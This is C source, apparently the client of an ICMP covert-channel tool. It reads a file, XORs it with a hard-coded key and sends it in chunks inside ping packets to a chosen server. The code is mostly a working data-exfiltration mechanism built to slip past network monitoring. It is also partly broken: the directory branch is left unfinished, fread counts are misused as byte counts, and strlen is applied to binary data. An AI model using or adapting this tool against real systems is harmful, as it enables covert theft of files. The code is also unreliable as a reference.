#include "../icmp.h"

// Fonction pour exécuter en tant que client //
void run_client(const char *server_ip, const char *path, const int type)
{
    int sockfd = create_icmp_socket();
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, server_ip, &dest_addr.sin_addr);
    dest_addr.sin_addr.s_addr = inet_addr(server_ip);

    in_addr_t local_ip = get_local_ip_address();
    struct packet pkt = create_icmp_header(ICMP_ECHO, 0, local_ip, inet_addr(server_ip));

    if (type == 1) // 0 = dir / 1 = file //
    {
        if (access(path, R_OK) == 0)
        {
            read_send(path, sockfd, pkt, dest_addr);
        }
        else
        {
            perror("\033[0;31m[!] Unable to read file\033[0m\n");
            exit(EXIT_FAILURE);
        }
    }
    else if (type == 0)
    {
        DIR* dir = opendir(path);
        if (dir == NULL)
        {
            perror("\033[0;31m[!] Unable to find folder\033[0m\n");
            close(sockfd);
            exit(EXIT_FAILURE);
        }

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL)
        {
            // TBD //
        }
        closedir(dir);
    }
    else
    {
        perror("\033[0;31m[!] Invalid path type\033[0m\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    close(sockfd);
}

void read_send(const char *path, int sockfd, struct packet pkt, struct sockaddr_in dest_addr)
{
    char payload[512];
    FILE *ptr;
    int needed_p = 0;
    int current_p = 0;
    int count = 0;
    int totalread = 0;

    ptr = fopen(path,"rb");
    if (!ptr)
    {
        perror("\033[0;31m[!] Error opening file\033[0m\n");
        exit(EXIT_FAILURE);
    }

    // pkt.payload.tid = rand(); //
    // pkt.payload.total = needed_p; //

    needed_p = calc_pkt(ptr);
    while (!feof(ptr))
    {
        // pkt.payload.num = current_p; //
        totalread += fread(payload, sizeof(payload), 1, ptr);
        count = totalread;
        if (count >= 512 || needed_p > current_p)
        {
            current_p++;
            count = 0;
            loading(current_p, needed_p);
            pkt.payload.dsize = strlen(xor_encrypt(payload, "LACLEDEFOU"));
            memcpy(pkt.payload.data, payload, pkt.payload.dsize);
            pkt.icmp.checksum = 0;
            pkt.icmp.checksum = checksum(&pkt.icmp, sizeof(pkt.icmp) + pkt.payload.dsize);

            ssize_t bytes_sent = sendto(sockfd, &pkt, sizeof(pkt.icmp) + sizeof(pkt.ip) + pkt.payload.dsize, 0,
                (struct sockaddr *)&dest_addr, sizeof(struct sockaddr_in));

            if (bytes_sent <= 0)
            {
                perror("\033[0;31m[!] Error while trying to send ICMP packet\033[0m\n");
                close(sockfd);
                exit(EXIT_FAILURE);
            }
            memset(payload, 0, pkt.payload.dsize);
            sleep(1);

        }
    }
    printf("\n");

    fclose(ptr);
}
